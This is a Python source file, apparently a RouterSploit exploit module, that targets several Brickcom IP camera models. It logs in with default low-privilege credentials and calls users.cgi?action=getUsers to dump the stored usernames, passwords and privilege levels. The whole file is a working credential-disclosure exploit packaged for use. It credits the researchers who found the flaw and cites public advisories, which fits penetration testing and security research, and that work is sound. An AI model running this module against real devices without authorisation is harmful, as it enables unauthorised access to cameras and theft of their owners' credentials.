import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Brickcom Camera Credentials Disclosure",
        "description": "Exploit implementation for miscellaneous Brickcom cameras with 'users.cgi'."
                       "Allows remote credential disclosure by low-privilege user.",
        "authors": (
            "Emiliano Ipar <@maninoipar>",  # vulnerability discovery
            "Ignacio Agustin Lizaso <@ignacio_lizaso>",  # vulnerability discovery
            "Gaston Emanuel Rivadero <@derlok_epsilon>",  # vulnerability discovery
            "Josh Abraham",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/42588/",
            "https://www.brickcom.com/news/productCERT_security_advisorie.php",
        ),
        "devices": (
            "Brickcom WCB-040Af",
            "Brickcom WCB-100A",
            "Brickcom WCB-100Ae",
            "Brickcom OB-302Np",
            "Brickcom OB-300Af",
            "Brickcom OB-500Af",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.credentials = (
            ("admin", "admin"),
            ("viewer", "viewer"),
            ("rviewer", "rviewer"),
        )

        self.configuration = None

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Dumping configuration...")
            print_info(self.configuration)
        else:
            print_error("Exploit failed - target does not appear vulnerable")

    @mute
    def check(self):
        for username, password in self.credentials:
            response = self.http_request(
                method="GET",
                path="/cgi-bin/users.cgi?action=getUsers",
                auth=(username, password)
            )

            if response is None:
                break

            if any([re.findall(regexp, response.text) for regexp in [r"User1.username=.*", r"User1.password=.*", r"User1.privilege=.*"]]):
                self.configuration = response.text
                return True  # target is vulnerable

        return False  # target is not vulnerable
